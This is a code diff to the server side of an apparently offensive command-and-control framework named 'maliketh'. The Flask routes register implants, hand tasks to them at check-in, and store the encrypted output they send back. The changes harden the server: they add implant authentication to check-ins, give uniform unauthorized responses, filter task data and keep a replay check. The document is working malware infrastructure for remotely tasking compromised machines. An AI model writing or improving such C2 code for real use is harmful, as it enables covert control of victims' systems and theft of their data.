@@ -11,13 +11,20 @@ from maliketh.config import (
     get_c2_server_option,
     C2_BASE_PATH,
 )
-from maliketh.crypto.ec import generate_ecc_keypair, encrypt, load_pubkey, load_privkey, decrypt_b64
+from maliketh.crypto.ec import (
+    generate_ecc_keypair,
+    encrypt,
+    load_pubkey,
+    load_privkey,
+    decrypt_b64,
+)
 from maliketh.logging.standard_logger import StandardLogger, LogLevel
 from nacl.encoding import Base64Encoder
 import base64
 
 logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
 c2 = Blueprint("c2", __name__, url_prefix=C2_BASE_PATH)
+
 
 def implant_authenticated(func: Callable):
     """
@@ -27,30 +34,30 @@ def implant_authenticated(func: Callable):
 
     @wraps(func)
     def wrapper(*args, **kwargs):
-
         if request.endpoint == get_c2_route("register"):
             return
-        
+
         imp_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
         if imp_id is None:
-            return "Invalid cookie", 401
-        
+            return "Unauthorized", 401
+
         implant = Implant.query.filter_by(implant_id=imp_id).first()
         if implant is None:
-            return "Implant doesn't exist", 401
+            return "Unauthorized", 401
 
         # Decrypt the request body
         try:
-            if request.data is not None:
-                print(request.get_data())
-                raw_decrypted = decrypt_b64(implant.implant_pk, implant.server_sk, request.get_data())
+            if request.get_data():
+                raw_decrypted = decrypt_b64(
+                    implant.implant_pk, implant.server_sk, request.get_data()
+                )
                 decrypted = json.loads(raw_decrypted)
+                return func(*args, **kwargs, decrypted_body=decrypted)
             else:
-                decrypted = {}
+                return func(*args, **kwargs)
 
-            return func(*args, **kwargs, decrypted_body=decrypted)
         except Exception as e:
-            logger.error(f"Failed to decrypt request body: {e}")
+            logger.error(f"Failed to decrypt request body: {e}: {request.get_data()}")
             return "Failed to decrypt", 401
 
     return wrapper
@@ -71,7 +78,7 @@ def register():
     }
     """
 
-    if request.json is None:
+    if request.json is None or request.json.get("txid") is None:
         return "Unauthorized", 401
 
     # Get the implant public key
@@ -141,7 +148,8 @@ def register():
     return resp
 
 
-@c2.route(get_c2_route("checkin"), methods=get_c2_route_methods("checkin"))
+@c2.route(get_c2_route("checkin"), methods=get_c2_route_methods("checkin"))  # type: ignore
+@implant_authenticated
 def get_task():
     # Get implant id from cookie
     implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
@@ -162,23 +170,16 @@ def get_task():
         task.read_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         task.status = TASKED
         db.session.commit()
-        return jsonify(task.toJSON())
+        return task.to_filtered_json()
     # If task is None, return empty task
     return jsonify({})
 
 
-@c2.route(get_c2_route("task_results"), methods=get_c2_route_methods("task_results")) # type: ignore
+@c2.route(get_c2_route("task_results"), methods=get_c2_route_methods("task_results"))  # type: ignore
 @implant_authenticated
-def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]]=None):
+def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
     """
     Get the output of a task and mark it as completed.
-    
-    Example request body (decrypted):
-    {
-        "status": bool,
-        "tid": "task_id_here",
-        "output": "b64_output_here",
-    }
     """
     if decrypted_body is None:
         return "Unauthorized", 401
@@ -189,10 +190,10 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]]=None):
     # Get implant id from cookie
     implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
 
-    if implant_id is None :
+    if implant_id is None:
         return "Unauthorized", 404
 
-    tid = cast(str, decrypted_body['tid'])
+    tid = cast(str, decrypted_body["tid"])
 
     # Check if implant ID exists, if not, throw 404
     implant = get_implant_by_id(implant_id)
@@ -205,18 +206,17 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]]=None):
     task = get_task_by_id(tid)
     # If task is not None, return task
     if task is not None:
-        
         if task.status != TASKED:
             print("Task is not tasked, possible replay attack")
             return "Unauthorized", 401
 
-        if decrypted_body['status']:
+        if decrypted_body["status"]:
             task.status = COMPLETE
-            task.output = decrypted_body['output']
+            task.output = decrypted_body["output"]
         else:
             task.status = ERROR
-            task.output = decrypted_body['output']
-        
+            task.output = decrypted_body["output"]
+
         task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         db.session.commit()
 
@@ -226,6 +226,7 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]]=None):
     # If task is None, return empty task
     return "Not Found", 404
 
+
 def verify_post_task_body(body: Dict[str, Union[str, bool]]) -> bool:
     """
     Verify that the body of the post_task request is valid.
@@ -234,12 +235,12 @@ def verify_post_task_body(body: Dict[str, Union[str, bool]]) -> bool:
     if len(set(["status", "tid", "output"]).intersection(set(body.keys()))) != 3:
         return False
 
-    if type(body['status']) != bool:
+    if type(body["status"]) != bool:
         return False
 
-    if type(body['tid']) != str:
+    if type(body["tid"]) != str:
         return False
 
-    if type(body['output']) != str:
-        return False 
+    if type(body["output"]) != str:
+        return False
     return True
